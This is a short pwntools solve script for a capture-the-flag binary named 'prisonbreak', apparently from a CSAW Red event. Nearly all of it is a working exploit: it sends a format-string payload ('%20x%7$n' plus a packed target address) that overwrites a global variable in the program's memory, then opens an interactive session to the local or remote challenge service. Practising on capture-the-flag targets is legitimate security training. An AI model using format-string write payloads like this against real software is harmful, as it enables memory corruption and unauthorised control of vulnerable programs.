
#solve_prisonbreak.py
#by N4T_20
# solve prisonbreak
# N4T_20

from pwn import *

local = True
debug = False
if local:
    if debug:
        p = gdb.debug('./prisonbreak',
            '''
            break main
            continue
            ''')
    else:
        #p = process('./prisonbreak')
        p = remote('localhost',8000)
else:
    p = remote('pwn.red.csaw.io', 8000)


p.recvuntil(">")

ROLL_VALUE_ADDR = 0x6020ac
payload = "%20x%7$n"+p64(ROLL_VALUE_ADDR)
p.send(payload+"\n")
p.interactive()


